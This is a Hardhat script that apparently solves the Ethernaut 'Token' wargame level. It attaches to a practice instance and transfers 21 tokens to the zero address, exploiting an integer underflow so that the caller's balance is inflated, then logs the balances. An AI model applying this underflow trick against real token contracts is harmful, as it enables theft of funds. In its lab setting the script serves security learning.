import { ethers } from "hardhat";
import { ETHERNAUT_ABI, ETHERNAUT_ADDRESS } from "./constants";

const INSTANCE_ADDRESS = "0x98F0Ce618a214b7Ef19960D8224215682c96cf79";

async function main() {
  const [me] = await ethers.getSigners();
  // Hardhat always runs the compile task when running scripts with its command
  // line interface.
  //
  // If this script is run directly using `node` you may want to call compile
  // manually to make sure everything is compiled
  // await hre.run('compile');

  // We get the contract to deploy
  const ethernaut = await ethers.getContractAt(
    ETHERNAUT_ABI,
    ETHERNAUT_ADDRESS
  );

  const Contract = await ethers.getContractFactory("Token");
  const contract = await Contract.attach(INSTANCE_ADDRESS);

  await contract.deployed();

  console.log("Starting balance: ", await contract.balanceOf(me.address));

  await contract.transfer(
    ethers.constants.AddressZero,
    ethers.utils.parseEther("21")
  );

  console.log(
    "Ending balance: ",
    await (await contract.balanceOf(me.address)).toString()
  );

  // with contract - does not pass level though as the new owner address is different
  // const Solution = await ethers.getContractFactory("Level4Solution");
  // const solution = await Solution.deploy(contract.address);
  // await solution.deployed();

  /**
   * Uncomment the below to automatically submit the level instance, you will have to refresh the ethernaut page and will not see the pretty level completed message.
   * I suggest submittin the instance on the ethernaut website.
   * I only did this for my own personal satisfaction
   */
  // submit level instance
  // const tx = await ethernaut.submitLevelInstance(INSTANCE_ADDRESS);
  // const rc = await tx.wait();
  // console.log(rc);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
